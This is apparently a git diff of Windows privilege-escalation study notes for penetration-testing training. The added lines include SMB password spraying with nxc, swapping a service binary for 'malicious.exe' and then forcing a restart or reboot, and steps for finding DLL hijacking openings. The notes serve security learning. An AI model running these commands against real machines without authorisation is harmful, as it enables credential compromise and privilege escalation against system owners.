@@ -88,10 +88,18 @@ get process path
  Get-Process -Name PROCESSNAME -FileVersionInfo
 ```
 
+watch command
+```
+wget https://raw.githubusercontent.com/markwragg/PowerShell-Watch/master/Watch/Public/Watch-Command.ps1
+Get-Process -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 20
+```
+
+
 ## security patches
 ```
 Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
 ```
+
 # Hidden in Plain View
 search for password manager
 ```
@@ -133,11 +141,13 @@ Script Logging EventViewer
 Go to Event Viewer → Events from Script Block Logging are in Application and Services → Microsoft → Windows → PowerShell → Operational
 Click Filter Current Log and search for 4104 events. The event will be among the first top 5
 ```
+
 # Valid Credentials Check 
 Check for valid credentials of logon-enabled users
 ```
 nxc smb 192.168.x.x -u usres.txt -p passwords.txt --continue-on-success
 ``` 
+
 # Check for Service Binary Hijacking
 List of services with binary path
 ```
@@ -158,6 +168,22 @@ icacls permission
 |W|Write-only access
 ```
 
+replaceing exe with malicious binary
+```
+move C:\path\to\target.exe target.exe
+move .\malicious.exe C:\path\to\target.exe
+```
+
+stop the service to restart
+```
+net stop SERVICE
+```
+
+if current user doesn't have sufficient permissions to stop the service, trying to reboot the machine
+```
+shutdown /r /t 0
+```
+
 # Check for DLL Hijacking
 ```
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | findstr /i /v "C:\Windows"
@@ -176,10 +202,19 @@ check winPEASx64.exe (example)
 ls binaryfolder
 ```
 
-check prcomon
-```
+check dll hijacking using prcomon
+1. download binary
+2. upload winprep
+3. create the service and run
+   `sc.exe create "Scheduler" binpath= "C:\Users\offsec\Desktop\Scheduler.exe`
+4. start service
+   `net start Scheduler`
+5. procmon filter list
+   `Process Name` is `BINARYNAME`
+   `Operation` is `CreateFile`
+   `Path` contains `dll`
+   
 
-```
 
 standard DLL search order
 ```
@@ -238,7 +273,7 @@ schtasks /query /fo LIST /v
 
 filtering 
 ```
-chtasks /query /fo LIST /v | findstr /C:"Task To Run:" | findstr /V /I "system32 COM handler"
+schtasks /query /fo LIST /v | findstr /C:"Task To Run:" | findstr /V /I "system32 COM handler"
 ```
 
 or
